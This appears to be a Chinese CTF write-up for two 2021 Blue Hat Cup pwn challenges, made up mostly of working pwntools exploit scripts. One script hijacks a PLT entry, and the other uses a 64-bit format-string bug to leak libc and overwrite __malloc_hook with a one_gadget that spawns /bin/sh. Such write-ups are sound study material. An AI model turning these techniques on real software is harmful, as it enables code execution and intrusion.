---
title: 蓝帽杯PWN
date: 2021-09-17 10:41:12
tags: 
    - 64位格式化字符串
    - plt表
---

## Cover

### exp

```python
#!/usr/bin/env python
from pwn import *
p = process("./pwn")
raw_input()
payload = p32(0x80484D6+1)
payload += "\x30"
p.send(payload)
p.send("/bin/sh\x00")
p.interactive()
```
* 本来是想改下一个`read()`函数的`push 0xa`，使其栈溢出，但是没达到目的.
* 之后就转向打plt表了，`pus(ptr) -> system(ptr)`

## hangman（绞死那个人）

### exp

```python
#!/usr/bin/env python
from pwn import *

binary = "./pwn"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(binary)
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
trs = lambda n: libc.address+n
guess = lambda n: p.sendlineafter("Guess a letter:",n)

def toleaklibc():
	sl("AAAA"+"%6$p")
	guess("A")
	guess("A")
	ru("Guess a letter:AAAA")
	libc.address = int(ru("\n"),16)-libc.sym["_IO_2_1_stdout_"]
	info("libc addr => 0x%x"%libc.address)
def change(addr,value):
	payload = ""
	payload += "DDDD"
	payload += "DDDD"
	payload += "BBB" 
	payload += "%%%05dc"%(value)
	payload += "%15$hn"
	payload += p64(addr)
	print(payload)
	ru("Enter a word:")
	sl(payload)
	guess("D")
	guess("D")
	guess("D")
	guess("B")
	guess("B")
def trigger():
	sl("AAAA"+"%100000c")
	guess("A")
	guess("A")
	guess("A")

toleaklibc()
malloc_hook = libc.sym["__malloc_hook"]

ogg = [libc.address+_ for _ in (0x45226,0x4527a,0xf03a4,0xf1247)]
og = ogg[1]

change(malloc_hook,0xffff&og - 0xb)
change(malloc_hook+2,0xffff&(og>>16) - 0xb)
trigger()

sh()

# b *$rebase(0x13B9)
# b *$rebase(0x136D)

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

```
* Tosay
    * 64bit的格式化字符串,`%6$p`，刚好是`rsp`指向的位置，接着以此向`rbp`数
    * `%1$p => rsi`
    * `%2$p => rdx`
    * `%3$p => rcx`
    * `%4$p => r8`
    * `%5$p => r9`
    * 64bit `%15$n`修改4byte  `0xffffffff&addr`
    * 64bit `%15$hn`修改2byte `0xffff&addr`
* `printf("%10000c")`会不会触发malloc，还是测试着试试看
